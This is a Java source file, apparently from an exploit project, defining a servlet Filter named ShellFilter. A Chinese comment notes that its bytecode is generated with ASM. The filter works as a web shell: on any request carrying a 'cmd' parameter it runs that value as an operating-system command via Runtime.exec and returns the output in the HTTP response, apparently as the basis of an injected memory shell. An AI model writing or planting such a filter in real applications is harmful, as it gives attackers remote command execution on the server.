package com.exp;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

/**
 * 并没有使用到
 * 使用ASM生成该类的字节码
 */
public class ShellFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if (req.getParameter("cmd") != null) {
            byte[] bytes = new byte[1024];
            Process process = Runtime.getRuntime().exec(req.getParameter("cmd"));
            int len = process.getInputStream().read(bytes);
            servletResponse.getWriter().write(new String(bytes, 0, len));
            process.destroy();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
